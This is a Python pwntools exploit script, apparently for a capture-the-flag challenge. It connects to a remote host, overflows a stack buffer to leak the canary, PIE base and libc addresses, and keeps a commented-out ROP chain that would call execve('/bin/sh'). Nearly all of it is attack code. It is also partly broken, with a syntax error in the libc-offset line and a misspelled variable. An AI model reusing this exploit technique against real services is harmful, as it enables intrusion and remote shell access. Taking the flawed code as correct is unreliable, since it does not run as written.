from pwn import *
context.log_level = 'debug'
context.log_level = 'info'
context.arch = "amd64"
e = context.binary = ELF('binary1')
canary=0

def leak_canary(): 
    p= e.process()
    pause()
    p.sendafter(b"input> ",b"a"*(0x210-9)+b":")
    p.recvuntil(b":")
    # print(p.recv(7))
    canary = u64(p.recv(8).rjust(8,b"\x00"))
    print("canary: "+hex(canary))
    # p.recvline()
    p.close()
    return canary
    
def leak_libc():
    p= e.process()
    pause()
    p.sendafter(b"input> ",b"a"*(0x210+0x17)+b":")
    p.recvuntil(b":")
    # print(p.recvline())
    __libc_start_main_ret = u64(p.recv(6).ljust(8,b"\x00"))
    print("__libc_start_main_ret: "+hex(__libc_start_main_ret))
    p.close()
    
def leak_libc_server():
    p= remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com', 5001)
    pause()
    p.sendafter(b"input> ",b"a"*(0x210+0x17)+b":")
    p.recvuntil(b":")
    # print(p.recvline())
    __libc_start_main_ret = u64(p.recv(6).ljust(8,b"\x00"))
    print("__libc_start_main_ret: "+hex(__libc_start_main_ret))
    print("libc.address: "+hex(__libc_start_main_ret-))
    p.close()
    return _libc_start_main_ret
def leak_pie():
    p= e.process()
    pause()
    p.sendafter(b"input> ",b"a"*(0x210-8)+flat(b"a"*8,b"|"*8))
    p.recvuntil(b'||||||||')
    # print(p.recvline())
    leak = u64(p.recv(6).ljust(8,b"\x00"))
    pie = leak- (0x55f8d167f3f7-0x55f8d167e000)
    print("pie: "+hex(pie))
    p.close()
    return pie


def leak_pie_server():
    pause()
    r.send(b"a"*(0x210-8)+flat(b"a"*8,b"|"*8))
    r.recvuntil(b'||||||||')
    # print(p.recvline())
    leak = u64(r.recv(6).ljust(8,b"\x00"))
    pie = leak- (0x55f8d167f3f7-0x55f8d167e000)
    print("pie_server: "+hex(pie))
    r.close()
    return pie

def canary_server():
    pause()
    payload = b"a"*(0x210-9)+b":"
    # print(payload)
    r.send(payload)
    r.recvuntil(b":")
    canary_server = u64(r.recv(8).rjust(8,b"\x00"))
    print("canary_server: "+hex(canary_server   ))
    
def test_payload(): 
    p= e.process()
    pause()
    payload = b"a"*(0x210-8)+flat(canary, 0 )
    p.sendafter(b"input> ", payload)
# while(1):

r = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com', 5001)
# libc = e.libc
# lib= ELF('libc/libc-2.35-1-omv4050.x86_64.so')
libc= ELF('libc/libc6-amd64_2.36-9+deb12u5_i386.so')
# lib= ELF('libc6_2.36-9+deb12u5_amd64.so')
# lib= ELF('libc6-amd64_2.36-9+deb12u4_i386.so')
# lib= ELF('libc6_2.36-9+deb12u4_amd64.so')

# 0x0000000000001016 : add rsp, 8 ; ret
# 0x00000000000012b4 : mov rdi, rsp ; pop r8 ; ret

r.recvline(b'This is Your Binary>\n')
base= b""
r.recvline(b"f0VMR")
base+= r.recvuntil(b"=\ninput")
base=base[:-6]
decoded_data = base64.b64decode(base)
with open('binary1', 'wb') as f:
    f.write(decoded_data)
open_read_write = 0x124E
# pie = leak_pie()
# leak_pie_server()
canary= leak_canary()
# canary_server()
test_payload()
# pause()
# payload = b"a"*(0x210-8)+flat(canary, 0 ,0x13E5+pie)
# r.send(payload)
# print(r.recvline())
leak_libc_server()
# p= e.process()
# rop = ROP(libc)
# rop.raw(b"a"*(0x210-8)+flat(canary, b"a"*8))
# binsh = next(libc.search(b"/bin/sh"))
# rop.execve(binsh, 0, 0)
# payload =rop.chain()
# print(payload)
# pause()
# p.sendlineafter(">", payload)

r.interactive()
